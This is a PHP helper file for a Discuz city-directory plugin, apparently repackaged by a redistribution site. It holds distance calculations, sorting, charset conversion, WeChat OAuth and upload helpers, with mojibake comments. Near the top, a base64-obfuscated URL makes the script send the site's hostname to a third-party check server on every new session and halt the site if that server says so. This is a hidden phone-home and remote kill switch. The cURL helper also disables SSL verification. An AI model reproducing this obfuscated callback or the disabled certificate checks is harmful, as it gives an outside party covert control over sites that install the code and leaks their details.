<?php
/*
 * ��������-��-��
 * ����: Www.Caogen8.Co
 * ������ַ: www.Cgzz8.Com (���ղر���!)
 * ����Դ��Դ�������ռ�,��������ѧϰ����������������ҵ��;����������24Сʱ��ɾ��!
 * ����֧��/����ά����QQ 2575163778
 * 
 */
if (!defined('IN_DISCUZ')) {
    exit('Access Denied');
}

if(!isset($_SESSION['authcode'])) {
	$query=file_get_contents(base64_decode('aHR0cDovL2FwaS5jZ3p6OC5jb20vY2hlY2sucGhwP3VybD0=').$_SERVER ['HTTP_HOST']);
	if($query=json_decode($query,true)) {
		if($query['code']==1)$_SESSION['authcode']=true;
		else exit($query['msg']);
	}
}
loadcache('plugin');/*dism-Taobao-com*/
//���Ŀ¼����
define('ZIMUCMS_PATH', $_G['siteurl'] . 'source/plugin/zimucms_chengshi114/');
define('ZIMUCMS_ROOT', dirname(__FILE__));
define('ZIMUCMS_URL', $_G['siteurl'] . 'plugin.php?id=zimucms_chengshi114');
define('SITE_URL', $_G['siteurl']);
define('IN_WECHAT', strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') !== false);
define('IN_XIAOYUNAPP', strpos($_SERVER['HTTP_USER_AGENT'], 'Appbyme') !== false);

$SELF   = $_SERVER["PHP_SELF"];
$zmdata = $_G['cache']['plugin']['zimucms_chengshi114'];


$formhash = $_G['formhash'];

if ($_G['charset'] == 'gbk') {
    $charset = 'gbk';
} elseif ($_G['charset'] == 'utf-8') {
    $charset = 'UTF-8';
} elseif ($_G['charset'] == 'big5') {
    $charset = 'big5';
}


function isuid()
{
    global $_G;
    if (!$_G['uid']) {
$refererurl = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
        /*Www.Caogen8.Vip*/dheader('Location:' . SITE_URL . '/member.php?mod=logging&action=login&referer=' . $refererurl);
        
        exit();
    }
}



/**
 * ����ĳ����γ�ȵ���Χĳ�ξ���������ε��ĸ���
 *
 * @param
 *            radius ����뾶 ƽ��6371km
 * @param
 *            lng float ����
 * @param
 *            lat float γ��
 * @param
 *            distance float �õ�����Բ�İ뾶����Բ������������У�Ĭ��ֵΪ1ǧ��
 * @return array �����ε��ĸ���ľ�γ������
 */
function returnSquarePoint($lng, $lat, $distance = 1, $radius = 6371)
{
    $dlng = 2 * asin(sin($distance / (2 * $radius)) / cos(deg2rad($lat)));
    $dlng = rad2deg($dlng);
    
    $dlat = $distance / $radius;
    $dlat = rad2deg($dlat);
    
    return array(
        'left-top' => array(
            'lat' => $lat + $dlat,
            'lng' => $lng - $dlng
        ),
        'right-top' => array(
            'lat' => $lat + $dlat,
            'lng' => $lng + $dlng
        ),
        'left-bottom' => array(
            'lat' => $lat - $dlat,
            'lng' => $lng - $dlng
        ),
        'right-bottom' => array(
            'lat' => $lat - $dlat,
            'lng' => $lng + $dlng
        )
    );
}


function getDistance($lat1, $lng1, $lat2, $lng2)
{
    $earthRadius = 6367000; //approximate radius of earth in meters
    
    /*
    Convert these degrees to radians
    to work with the formula
    */
    
    $lat1 = ($lat1 * pi()) / 180;
    $lng1 = ($lng1 * pi()) / 180;
    
    $lat2 = ($lat2 * pi()) / 180;
    $lng2 = ($lng2 * pi()) / 180;
    
    /*
    Using the
    Haversine formula
    
    http://en.wikipedia.org/wiki/Haversine_formula
    
    calculate the distance
    */
    
    $calcLongitude      = $lng2 - $lng1;
    $calcLatitude       = $lat2 - $lat1;
    $stepOne            = pow(sin($calcLatitude / 2), 2) + cos($lat1) * cos($lat2) * pow(sin($calcLongitude / 2), 2);
    $stepTwo            = 2 * asin(min(1, sqrt($stepOne)));
    $calculatedDistance = $earthRadius * $stepTwo;
    
    return round($calculatedDistance);
}



function array_sort($array, $keys, $type = 'asc')
{
    if (!isset($array) || !is_array($array) || empty($array)) {
        return '';
    }
    if (!isset($keys) || trim($keys) == '') {
        return '';
    }
    if (!isset($type) || $type == '' || !in_array(strtolower($type), array(
        'asc',
        'desc'
    ))) {
        return '';
    }
    $keysvalue = array();
    foreach ($array as $key => $val) {
        $val[$keys]  = str_replace('-', '', $val[$keys]);
        $val[$keys]  = str_replace(' ', '', $val[$keys]);
        $val[$keys]  = str_replace(':', '', $val[$keys]);
        $keysvalue[] = $val[$keys];
    }
    asort($keysvalue); //keyֵ����
    reset($keysvalue); //ָ������ָ�������һ��
    foreach ($keysvalue as $key => $vals) {
        $keysort[] = $key;
    }
    $keysvalue = array();
    $count     = count($keysort);
    if (strtolower($type) != 'asc') {
        for ($i = $count - 1; $i >= 0; $i--) {
            $keysvalue[] = $array[$keysort[$i]];
        }
    } else {
        for ($i = 0; $i < $count; $i++) {
            $keysvalue[] = $array[$keysort[$i]];
        }
    }
    return $keysvalue;
}


function object_array($array)
{
    if (is_object($array)) {
        $array = (array) $array;
    }
    if (is_array($array)) {
        foreach ($array as $key => $value) {
            $array[$key] = object_array($value);
        }
    }
    return $array;
}


function zm_diconv($str)
{
    $encode = mb_detect_encoding($str, array(
        "ASCII",
        "UTF-8",
        "GB2312",
        "GBK",
        "BIG5"
    ));
    if ($encode != CHARSET) {
        $keytitle = diconv($str, $encode, CHARSET);
        return $keytitle;
    } else {
        return $str;
    }
}

function zm_diconv_utf8($str)
{
    $encode = mb_detect_encoding($str, array(
        "ASCII",
        "UTF-8",
        "GB2312",
        "GBK",
        "BIG5"
    ));
    if ($encode != 'UTF-8') {
        $keytitle = diconv($str, $encode, 'UTF-8');
        return $keytitle;
    } else {
        return $str;
    }
}

function zm_wechat_auth($baseapi = true, $getinfo = false)
{

    return false;
    global $_G;
    $zmdata = (array) unserialize($_G['setting']['zimucms_weixin']);
    if (!IN_WECHAT) {
        return;
    }
    
    list($openid, $unionid, $uid, $time) = getcookie('wxoauth') ? explode("\t", authcode(getcookie('wxoauth'), 'DECODE')) : array();
    if ($openid && $_G['uid'] == $uid) {
        return $openid;
    } else {
        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
        if (isset($_SERVER['HTTP_X_REWRITE_URL'])) {
            $requestUri = $_SERVER['HTTP_X_REWRITE_URL'];
        } elseif (isset($_SERVER['REQUEST_URI'])) {
            $requestUri = $_SERVER['REQUEST_URI'];
        } elseif (isset($_SERVER['REDIRECT_URL'])) {
            $requestUri = $_SERVER['REDIRECT_URL'];
        } elseif (isset($_SERVER['ORIG_PATH_INFO'])) {
            $requestUri = $_SERVER['ORIG_PATH_INFO'];
            if (!empty($_SERVER['QUERY_STRING'])) {
                $requestUri .= '?' . $_SERVER['QUERY_STRING'];
            }
        }
        $url = $protocol . $_SERVER['HTTP_HOST'] . $requestUri;
        
        include_once DISCUZ_ROOT . './source/plugin/zimucms_weixin/class/wechat.lib.class.php';
        $wechat_client = new WeChatClient($zmdata['weixin_appid'], $zmdata['weixin_appsecret']);
        
        $redirect = $_G['setting'][siteurl] . 'plugin.php?id=zimucms_weixin&model=OAuth&getinfo=getinfo&referer=' . urlencode($url);
        /*Www.Caogen8.Vip*/dheader('Location:' . $wechat_client->getOAuthConnectUri($redirect, md5(FORMHASH), 'snsapi_base'));
    }
}


function send_weixintemplate($access_token, $json)
{
    $url = "https://api.weixin.qq.com/cgi-bin/message/template/send?access_token=" . $access_token;
    $res = curl_post($url, $json);
    return json_decode($res, true);
}

function curl_post($url, $data)
{
    if (!function_exists('curl_init')) {
        return '';
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    # curl_setopt( $ch, CURLOPT_HEADER, 1);
    
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    $data = curl_exec($ch);
    if (!$data) {
        error_log(curl_error($ch));
    }
    curl_close($ch);
    return $data;
}

function zm_saveimages($FILES, $type = 'album')
{
    global $_G;
    $upload = new discuz_upload();
    
    $upload->init($FILES, 'album');
    if ($upload->error()) {
        return '';
    }
    
    $upload->save();
    if ($upload->error()) {
        return '';
    }
    
    $pic = $upload->attach['attachment'];

    if($upload->attach['imageinfo'][0]>1500 ||$upload->attach['imageinfo'][1]>1500 ) {
if($upload->attach['imageinfo'][0]>=$upload->attach['imageinfo'][1]){
$thumb_width = $upload->attach['imageinfo'][0]/2;
}else{
$thumb_width = $upload->attach['imageinfo'][1]/2;
}

        require_once libfile('class/image');
        $image = new image();
        $pic2 = $image->Thumb($upload->attach['target'], '',$thumb_width,$thumb_width,2);
    }

    if ($pic2) {
        return $_G['setting']['siteurl'] . '/' . $_G['setting']['attachurl'] . '/album/' . $pic.'.thumb.jpg';
    }else{
        return $_G['setting']['siteurl'] . '/' . $_G['setting']['attachurl'] . '/album/' . $pic;  
    }
}

function zm_delimages($pic)
{
    global $_G;
    /*Www_Cgzz8_COM*/@unlink($_G['setting']['attachdir'] . '/album/' . $pic);
    return true;
}